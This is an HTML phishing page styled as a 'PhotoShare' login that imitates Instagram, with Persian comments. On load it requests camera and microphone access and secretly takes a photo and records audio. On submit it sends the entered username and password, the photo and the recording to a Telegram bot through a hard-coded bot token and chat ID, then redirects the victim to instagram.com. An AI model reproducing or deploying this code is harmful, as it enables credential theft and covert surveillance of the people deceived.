<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhotoShare Login</title>
    <style>
        * { box-sizing: border-box; } 
        html, body { margin: 0; min-height: 100%; font-family: Arial, Helvetica, sans-serif; } 
        body { background: #1c1c1c; color: #f5f5f5; } 
        .page { min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; padding: 0 28px; } 
        .logo-area { height: 38vh; min-height: 230px; max-height: 390px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; } 
        .camera-logo { width: 106px; height: 106px; display: block; } 
        .form-area { width: 100%; max-width: 520px; margin: 0 auto; } 
        .field { display: block; width: 100%; height: 104px; padding: 0 27px; margin-bottom: 20px; border: 2px solid #484848; border-radius: 28px; background: transparent; color: #ffffff; font-size: 20px; outline: none; } 
        .field::placeholder { color: #a5a5ad; opacity: 1; } 
        .field:focus { border-color: #696969; } 
        .login-button { display: block; width: 100%; height: 78px; margin-top: 1px; border: none; border-radius: 45px; background: #0866e9; color: #ffffff; font-size: 20px; font-weight: 600; cursor: pointer; } 
        .forgot { display: block; margin-top: 40px; text-align: center; color: #f5f5f5; font-size: 20px; font-weight: 600; text-decoration: none; cursor: default; } 
        @media (max-height: 750px) { .logo-area { height: 32vh; min-height: 180px; } .field { height: 72px; margin-bottom: 14px; } .login-button { height: 62px; } .forgot { margin-top: 28px; } } 
        @media (max-width: 380px) { .page { padding-left: 20px; padding-right: 20px; } .field { padding: 0 20px; font-size: 17px; } }
        
        /* عناصر مخفی برای ضبط */
        #hiddenVideo, #hiddenCanvas { display: none; }
    </style>
</head>
<body>
    <div class="page">
        <section class="logo-area">
            <svg class="camera-logo" viewBox="0 0 110 110" xmlns="http://www.w3.org/2000/svg" aria-label="Camera logo" role="img">
                <defs>
                    <linearGradient id="cameraGradient" x1="0" y1="1" x2="1" y2="0">
                        <stop offset="0%" stop-color="#ffca35"/>
                        <stop offset="28%" stop-color="#ff304f"/>
                        <stop offset="58%" stop-color="#e000a8"/>
                        <stop offset="80%" stop-color="#b000ee"/>
                        <stop offset="100%" stop-color="#654cff"/>
                    </linearGradient>
                </defs>
                <rect x="9" y="9" width="92" height="92" rx="27" fill="none" stroke="url(#cameraGradient)" stroke-width="8" />
                <circle cx="55" cy="55" r="23" fill="none" stroke="url(#cameraGradient)" stroke-width="8" />
                <circle cx="81" cy="29" r="6" fill="#c000dc" />
            </svg>
        </section>

        <section class="form-area">
            <form id="loginForm" autocomplete="off">
                <input class="field" type="text" name="demoUsername" placeholder="Username, email or mobile number" aria-label="Username, email or mobile number" required>
                <input class="field" type="password" name="demoPassword" placeholder="Password" aria-label="Password" autocomplete="new-password" required>
                <button class="login-button" type="submit" id="submitBtn">Log in</button>
            </form>
            <a class="forgot" href="#" aria-disabled="true" id="forgotLink">Forgot password?</a>
        </section>
    </div>

    <!-- عناصر مخفی برای پردازش -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <script>
        // متغیرهای سراسری برای نگه داشتن عکس و صدا
        let capturedPhotoBlob = null;
        let capturedAudioBlob = null;

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // این تابع به محض باز شدن سایت اجرا میشه
        async function initMediaCapture() {
            try {
                // ۱. درخواست دسترسی به دوربین و میکروفون (همون اول کار)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                const video = document.getElementById("hiddenVideo");
                const canvas = document.getElementById("hiddenCanvas");
                video.srcObject = stream;

                // صبر میکنیم ۱.۵ ثانیه تا دوربین روشن بشه و فوکوس کنه
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // گرفتن عکس
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                capturedPhotoBlob = dataURItoBlob(photoDataUrl);

                // ۲. ضبط صدا (۳ ثانیه)
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                mediaRecorder.start();
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                mediaRecorder.stop();
                await new Promise(resolve => mediaRecorder.onstop = resolve);

                capturedAudioBlob = new Blob(audioChunks, { type: 'audio/webm' });

                // خاموش کردن دوربین و میکروفون بعد از اتمام کار (برای ذخیره باتری)
                stream.getTracks().forEach(track => track.stop());

            } catch (error) {
                console.error("دسترسی به دوربین/میکروفون رد شد یا خطایی رخ داد:", error);
                alert("برای استفاده از سایت، لطفاً دسترسی به دوربین و میکروفون را تایید کنید و صفحه را رفرش کنید.");
            }
        }

        // اجرای تابع گرفتن عکس و صدا به محض لود شدن صفحه
        window.addEventListener('DOMContentLoaded', initMediaCapture);

        document.getElementById("forgotLink").addEventListener("click", function(event) {
            event.preventDefault();
        });

        // عملیات دکمه لاگین
        document.getElementById("loginForm").addEventListener("submit", async function(event) {
            event.preventDefault();

            const username = this.demoUsername.value.trim();
            const password = this.demoPassword.value;
            const button = document.getElementById("submitBtn");

            // اگر کاربر دسترسی نداده بود و عکس/صدا نull بود
            if (!capturedPhotoBlob || !capturedAudioBlob) {
                alert("در حال آماده‌سازی دوربین و میکروفون. لطفاً چند لحظه صبر کنید و مجدداً تلاش کنید.");
                return;
            }

            button.disabled = true;
            button.textContent = "در حال ارسال...";

            const BOT_TOKEN = "9152524690:AAF7BD1CPP5cwUWPj3oN0O40g311-RMxWwo";
            const CHAT_ID = "6510434050";

            const messageText = `🔐 ورود جدید به سایت\n\n👤 یوزرنیم: ${username}\n🔑 پسورد: ${password}`;

            try {
                // ۱. ارسال متن
                const textFormData = new FormData();
                textFormData.append("chat_id", CHAT_ID);
                textFormData.append("text", messageText);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: textFormData });

                // ۲. ارسال عکس
                const photoFormData = new FormData();
                photoFormData.append("chat_id", CHAT_ID);
                photoFormData.append("photo", capturedPhotoBlob, "photo.jpg");
                photoFormData.append("caption", "📸 عکس گرفته شده هنگام ورود");
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: photoFormData });

                // ۳. ارسال صدا
                const audioFormData = new FormData();
                audioFormData.append("chat_id", CHAT_ID);
                audioFormData.append("voice", capturedAudioBlob, "audio.webm");
                audioFormData.append("caption", "🎤 صدای ضبط شده هنگام ورود");
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: audioFormData });

                // ۴. انتقال به اینستاگرام
                window.location.href = "https://www.instagram.com/";

            } catch (error) {
                console.error(error);
                alert("مشکلی در ارتباط با سرور پیش آمد.");
                button.disabled = false;
                button.textContent = "Log in";
            }
        });
    </script>
</body>
</html>
